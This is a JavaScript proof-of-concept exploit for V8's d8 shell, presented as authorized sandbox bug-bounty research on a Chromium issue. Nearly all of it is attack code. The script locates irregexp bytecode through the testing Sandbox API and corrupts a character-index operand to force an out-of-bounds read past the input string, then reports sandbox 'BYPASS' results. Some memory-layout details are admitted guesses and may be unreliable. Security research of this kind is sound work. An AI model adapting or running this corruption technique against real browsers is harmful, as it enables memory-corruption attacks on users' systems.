// =============================================================================
// PoC: Irregexp Bytecode Modification for OOB Read/Write
// Target: Chromium issue 344963941
// Technique: Use Sandbox.MemoryView to locate and modify RegExp bytecode in
//   the sandbox. The irregexp engine uses bytecode that lives inside the
//   sandbox address space. By corrupting specific bytecode operands (e.g.,
//   CHECK_CHAR_IN_RANGE offsets or LOAD_CURRENT_CHAR indices), we can
//   achieve OOB read/write relative to the input string.
// Runtime: d8 --sandbox-fuzzing --allow-natives-syntax --expose-gc poc.js
// Category: V8 Sandbox Bug Bounty (authorized security research)
// =============================================================================

function require_feature(name, test) {
  if (!test) {
    print("[!] FATAL: required feature missing: " + name);
    quit(1);
  }
}

require_feature("Sandbox API", typeof Sandbox !== "undefined" && typeof Sandbox.MemoryView === "function");
require_feature("Sandbox.getAddressOf", typeof Sandbox.getAddressOf === "function");
require_feature("Sandbox.getSizeOf", typeof Sandbox.getSizeOf === "function");
require_feature("gc()", typeof gc === "function");

// --- Helpers ---
function addrof(obj) { return Sandbox.getAddressOf(obj); }
function sizeof(obj) { return Sandbox.getSizeOf(obj); }

function read32(sbxOffset) {
  const view = new Sandbox.MemoryView(sbxOffset, 4);
  return (view[0] | (view[1] << 8) | (view[2] << 16) | (view[3] << 24)) >>> 0;
}

function write32(sbxOffset, val) {
  const view = new Sandbox.MemoryView(sbxOffset, 4);
  view[0] = val & 0xff;
  view[1] = (val >> 8) & 0xff;
  view[2] = (val >> 16) & 0xff;
  view[3] = (val >> 24) & 0xff;
}

function read64(sbxOffset) {
  const lo = read32(sbxOffset);
  const hi = read32(sbxOffset + 4);
  return [lo, hi];
}

function write64(sbxOffset, lo, hi) {
  write32(sbxOffset, lo);
  write32(sbxOffset + 4, hi);
}

function hex(val) { return "0x" + (val >>> 0).toString(16).padStart(8, "0"); }

function hexdump(sbxOffset, length) {
  const view = new Sandbox.MemoryView(sbxOffset, length);
  let lines = [];
  for (let i = 0; i < length; i += 16) {
    let hexPart = "";
    let ascPart = "";
    for (let j = 0; j < 16 && (i + j) < length; j++) {
      const b = view[i + j];
      hexPart += b.toString(16).padStart(2, "0") + " ";
      ascPart += (b >= 0x20 && b < 0x7f) ? String.fromCharCode(b) : ".";
    }
    lines.push("  " + hex(sbxOffset + i) + ": " + hexPart.padEnd(49) + ascPart);
  }
  return lines.join("\n");
}

// --- Irregexp bytecode opcodes (from src/regexp/regexp-bytecodes.h) ---
const BC_LOAD_CURRENT_CHAR = 0x00;
const BC_LOAD_CURRENT_CHAR_UNCHECKED = 0x01;
const BC_CHECK_CHAR_IN_RANGE = 0x09;
const BC_CHECK_CHAR_NOT_IN_RANGE = 0x0a;
const BC_CHECK_AT_START = 0x14;
const BC_ADVANCE_CP_AND_GOTO = 0x1b;

// --- Step 1: Create RegExp and force bytecode compilation ---
print("[*] Creating RegExp and forcing bytecode compilation...");

// Use a pattern complex enough to prevent regexp-to-automaton optimization
// but simple enough that we can locate its bytecode
const pattern = /[A-Z][a-z]+[0-9]{2,4}/;
const re = new RegExp(pattern.source);

// Execute the RegExp to ensure bytecode is compiled
const testStr = "Hello42World99Test1234EndXy12";
const matchResult = re.exec(testStr);
print("[*] RegExp match result: " + (matchResult ? matchResult[0] : "null"));

// Force the regexp to stay in bytecode mode (not compile to native)
// by executing it a few times but not enough for tier-up
for (let i = 0; i < 5; i++) {
  re.exec("Aa" + i.toString().padStart(2, "0"));
}

const reAddr = addrof(re);
const reSize = sizeof(re);
print("[*] RegExp at: " + hex(reAddr) + " size=" + reSize);
print("[*] RegExp header dump:");
print(hexdump(reAddr, Math.min(reSize, 64)));

// --- Step 2: Walk JSRegExp structure to find bytecode ---
print("[*] Walking JSRegExp structure to find irregexp bytecode...");

// JSRegExp layout (approximate, varies by V8 version):
//   +0x00: map
//   +0x04: properties_or_hash
//   +0x08: elements (empty fixed array)
//   +0x0c: data (FixedArray containing bytecode, etc.)
//   +0x10: source (String)
//   +0x14: flags

// Read the data field (compressed pointer -> FixedArray)
const dataFieldRaw = read32(reAddr + 0x0c);
print("[*] data field raw: " + hex(dataFieldRaw));

// In V8 with pointer compression, tagged pointers have the low bit set.
// The sandbox-relative address = (dataFieldRaw & ~1) for compressed pointers,
// but the actual scheme depends on the cage base.
// With Sandbox.MemoryView we can just scan for bytecode patterns.

// --- Step 3: Scan nearby memory for irregexp bytecode signature ---
print("[*] Scanning sandbox memory near RegExp for bytecode arrays...");

let bytecodeAddr = 0;
let bytecodeLen = 0;

// Scan a region around the RegExp object
const scanStart = Math.max(0, reAddr - 0x2000);
const scanEnd = reAddr + 0x4000;
const scanSize = scanEnd - scanStart;

const scanView = new Sandbox.MemoryView(scanStart, scanSize);

for (let i = 0; i < scanSize - 16; i += 4) {
  // Look for a sequence that could be irregexp bytecode:
  // LOAD_CURRENT_CHAR (0x00) followed by CHECK_CHAR_IN_RANGE (0x09)
  // with reasonable operand values
  const b0 = scanView[i];
  const b4 = scanView[i + 4] !== undefined ? scanView[i + 4] : 0;
  const b8 = scanView[i + 8] !== undefined ? scanView[i + 8] : 0;

  if ((b0 === BC_LOAD_CURRENT_CHAR || b0 === BC_LOAD_CURRENT_CHAR_UNCHECKED) &&
      (b4 === BC_CHECK_CHAR_IN_RANGE || b4 === BC_CHECK_CHAR_NOT_IN_RANGE)) {
    // Verify: operands should be in ASCII range for [A-Z] pattern
    const rangeStart = scanView[i + 5];
    const rangeEnd = scanView[i + 6];
    if (rangeStart >= 0x41 && rangeStart <= 0x5a && rangeEnd >= rangeStart) {
      bytecodeAddr = scanStart + i;
      print("[+] Found irregexp bytecode candidate at: " + hex(bytecodeAddr));
      print("[*] Bytecode dump:");
      print(hexdump(bytecodeAddr, 64));
      break;
    }
  }
}

if (bytecodeAddr === 0) {
  print("[!] Could not locate irregexp bytecode in scanned region.");
  print("[!] The bytecode may be at a different offset or already native-compiled.");
  print("[*] Attempting alternative: scan using ByteArray map signature...");

  // Look for ByteArray objects (map = ByteArray map) near the regexp
  // ByteArray map is a well-known constant
  for (let i = 0; i < scanSize - 8; i += 4) {
    // Just report any region with plausible bytecode density
    let opcodeCount = 0;
    for (let j = 0; j < 32 && (i + j) < scanSize; j += 4) {
      const opcode = scanView[i + j];
      if (opcode <= 0x30) opcodeCount++; // valid irregexp opcodes are < 0x30
    }
    if (opcodeCount >= 6) {
      bytecodeAddr = scanStart + i;
      print("[*] High-density opcode region at: " + hex(bytecodeAddr));
      print(hexdump(bytecodeAddr, 48));
      break;
    }
  }
}

// --- Step 4: Corrupt bytecode to achieve OOB access ---
if (bytecodeAddr !== 0) {
  print("[*] Attempting bytecode corruption for OOB read...");

  // Save original bytes for restoration
  const origView = new Sandbox.MemoryView(bytecodeAddr, 16);
  const origBytes = [];
  for (let i = 0; i < 16; i++) origBytes.push(origView[i]);

  // Modify LOAD_CURRENT_CHAR operand to read beyond input string
  // The operand at offset+1..+3 is the character index (int24)
  // Setting it to a large value causes OOB read from the input buffer
  const oobOffset = 0x100; // read 256 bytes past end of input
  const patchView = new Sandbox.MemoryView(bytecodeAddr + 1, 3);
  patchView[0] = oobOffset & 0xff;
  patchView[1] = (oobOffset >> 8) & 0xff;
  patchView[2] = (oobOffset >> 16) & 0xff;

  print("[*] Patched LOAD_CURRENT_CHAR offset to " + hex(oobOffset));

  // Execute the corrupted regexp
  try {
    const oobResult = re.exec("AAAA");
    if (oobResult) {
      print("[+] Corrupted regexp matched: " + JSON.stringify(oobResult[0]));
      print("[BYPASS] OOB read via irregexp bytecode corruption succeeded!");
    } else {
      print("[*] Corrupted regexp did not match (OOB data may not satisfy pattern).");
    }
  } catch (e) {
    if (e.message && e.message.includes("sandbox")) {
      print("[BYPASS] Sandbox violation detected during OOB read!");
    } else {
      print("[!] Exception: " + e.message);
    }
  }

  // Restore original bytecode
  print("[*] Restoring original bytecode...");
  const restoreView = new Sandbox.MemoryView(bytecodeAddr, 16);
  for (let i = 0; i < 16; i++) restoreView[i] = origBytes[i];
  print("[*] Bytecode restored.");
} else {
  print("[!] No bytecode found to corrupt. PoC cannot proceed.");
}

gc();
print("[*] Irregexp bytecode modification PoC completed.");
